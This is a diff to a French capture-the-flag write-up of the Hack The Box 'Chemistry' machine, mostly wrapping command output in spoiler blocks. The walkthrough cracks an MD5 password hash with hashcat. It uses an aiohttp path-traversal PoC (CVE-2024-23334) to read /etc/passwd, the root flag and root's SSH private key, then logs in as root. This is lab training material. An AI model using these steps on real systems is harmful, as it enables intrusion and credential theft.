@@ -25,6 +25,8 @@ nmap -A -T4 chemistry.htb
 ```
 
 {% capture spoil %}
+
+```txt
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-26 11:14 CEST
 Warning: 10.10.11.38 giving up on port because retransmission cap hit (6).
 Nmap scan report for chemistry.htb (10.10.11.38)
@@ -59,6 +61,8 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 162.53 seconds
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -79,7 +83,12 @@ Nous sommes inviter à créer notre propre compte, puis nous avons accès à une
 Nous récupérons le fichier d'exemple en cliquant sur `here` et nous tentons de le téléverser sur notre compte.
 
 ```bash
-cat example.cif                  
+cat example.cif
+```
+
+{% capture spoil %}
+
+```txt
 data_Example
 _cell_length_a    10.00000
 _cell_length_b    10.00000
@@ -97,6 +106,9 @@ loop_
  H 0.00000 0.00000 0.00000 1
  O 0.50000 0.50000 0.50000 1
 ```
+
+{% endcapture %}
+{% include elements/spoil.html %}
 
 Le fichier apparaît désormais dans notre tableau de bord, et nous pouvons l'ouvrir.
 
@@ -212,10 +224,15 @@ Nous pouvons ouvrir et naviguer dans la base de données grâce à l'outil `sqli
 sqlite3 database.db
 ```
 
-```txt
+```sql
 .tables
 structure  user
-select * from user;
+SELECT * FROM user;
+```
+
+{% capture spoil %}
+
+```txt
 1|admin|2861[...expurgé...]52abf
 2|app|1978[...expurgé...]9886a
 3|rosa|63ed[...expurgé...]251a5
@@ -225,6 +242,9 @@ select * from user;
 [...expurgé pour brièveté...]
 ```
 
+{% endcapture %}
+{% include elements/spoil.html %}
+
 Nous y retrouvons même nos identifiants utilisés pour interagir avec l'application. Mais plus important : nous trouvons des identifiants pour `rosa`.
 
 Nous commençons par utiliser `hash-identifier` pour déterminer le chiffrement du mot de passe :
@@ -232,11 +252,18 @@ Nous commençons par utiliser `hash-identifier` pour déterminer le chiffrement 
 ```bash
 hash-identifier
 HASH: 63ed[...expurgé...]251a5
+```
 
+{% capture spoil %}
+
+```txt
 Possible Hashs:
 [+] MD5
 [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
 ```
+
+{% endcapture %}
+{% include elements/spoil.html %}
 
 Puis nous utiliserons {% include dictionary.html word="Hashcat" %} pour tenter de forcer le mot de passe.
 
@@ -245,6 +272,8 @@ hashcat -m 0 '63ed[...expurgé...]251a5' /usr/share/wordlists/rockyou.txt
 ```
 
 {% capture spoil %}
+
+```txt
 hashcat (v6.2.6) starting
 
 [...expurgé pour brièveté...]
@@ -265,7 +294,7 @@ Dictionary cache hit:
 * Keyspace..: 14344385
 
 63ed[...expurgé...]251a5:uni[...expurgé...]dos        
-                                                          
+
 Session..........: hashcat
 Status...........: Cracked
 Hash.Mode........: 0 (MD5)
@@ -287,6 +316,8 @@ Hardware.Mon.#1..: Util: 32%
 
 Started: Sat Oct 26 12:33:29 2024
 Stopped: Sat Oct 26 12:33:55 2024
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -303,8 +334,16 @@ Nous pouvons désormais récupérer le flag utilisateur
 
 ```bash
 cat user.txt
+```
+
+{% capture spoil %}
+
+```txt
 fbc857[...expurgé...]e60b05
 ```
+
+{% endcapture %}
+{% include elements/spoil.html %}
 
 ## Élévation de privilèges
 
@@ -340,6 +379,8 @@ En tentant de nous connecter à ce serveur, nous obtenons la réponse suivante
 curl -i localhost:8080
 ```
 
+{% capture spoil %}
+
 ```html
 HTTP/1.1 200 OK
 Content-Type: text/html; charset=utf-8
@@ -367,6 +408,9 @@ Server: Python/3.9 aiohttp/3.9.1
     </style>
 </head>
 ```
+
+{% endcapture %}
+{% include elements/spoil.html %}
 
 En recherchant des informations sur `aiohttp`, nous trouvons des vulnérabilités, notamment le [CVE-2024-23334](https://github.com/z3rObyte/CVE-2024-23334-PoC) qui permet de tester différentes façons d'accéder à des fichiers. Nous copions le contenu du fichier `exploit.sh` sur le serveur sous `/tmp/.test/test.sh` et nous le modifions pour qu'il se connecte au port 8080 et non 8081, et qu'il prenne le dossier `/assets/` comme point de départ (dossier trouver lors du `curl` au-dessus) et non `/static/` comme dans la PoC.
 
@@ -396,7 +440,12 @@ done
 Le test est concluant, nous parvenons à récupérer le contenu du fichier cible :
 
 ```bash
-bash test.sh 
+bash test.sh
+```
+
+{% capture spoil %}
+
+```txt
 [+] Testing with /assets/../etc/passwd
 	Status code --> 404
 [+] Testing with /assets/../../etc/passwd
@@ -408,6 +457,9 @@ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 [...expurgé pour brièveté...]
 ```
 
+{% endcapture %}
+{% include elements/spoil.html %}
+
 Pour terminer ce défi, deux choix s'offre à nous : récupérer le flag root directement via cette exploitation, ou essayer d'obtenir des identifiants root sur la machine.
 
 ### Récupérer le flag
@@ -415,7 +467,12 @@ Pour terminer ce défi, deux choix s'offre à nous : récupérer le flag root di
 En remplaçant l'entrée `file="etc/passwd"` par `file="root/root.txt"` nous pouvons facilement obtenir le flag root :
 
 ```bash
-bash test.sh 
+bash test.sh
+```
+
+{% capture spoil %}
+
+```txt
 [+] Testing with /assets/../root/root.txt
 	Status code --> 404
 [+] Testing with /assets/../../root/root.txt
@@ -424,6 +481,9 @@ bash test.sh
 	Status code --> 200
 284bf1[...expurgé...]b09ad9
 ```
+
+{% endcapture %}
+{% include elements/spoil.html %}
 
 ### Obtenir l'accès root
 
@@ -434,7 +494,12 @@ Nous avons commencer par récupérer le hash du mot de passe de root en ouvrant 
 Nous avons ensuite cherché une clé {% include dictionary.html word="SSH" %} pour le compte root en modifiant l'entrée `file=root/.ssh/id_rsa`
 
 ```bash
-bash test.sh 
+bash test.sh
+```
+
+{% capture spoil %}
+
+```txt
 [+] Testing with /assets/../root/.ssh/id_rsa
 	Status code --> 404
 [+] Testing with /assets/../../root/.ssh/id_rsa
@@ -446,6 +511,9 @@ bash test.sh
 -----END OPENSSH PRIVATE KEY-----
 ```
 
+{% endcapture %}
+{% include elements/spoil.html %}
+
 Nous copions le contenu découvert sur notre machine, et nous lui attribuons les bons droits via la commande `chmod 600 id_rsa_root` puis nous pouvons nous connecter avec succès et récupérer le flag.
 
 ```bash
@@ -454,6 +522,14 @@ ssh -i id_rsa_root root@chemistry.htb
 id
 uid=0(root) gid=0(root) groups=0(root)
 
-cat root.txt 
+cat root.txt
+```
+
+{% capture spoil %}
+
+```txt
 284bf1[...expurgé...]b09ad9
 ```
+
+{% endcapture %}
+{% include elements/spoil.html %}
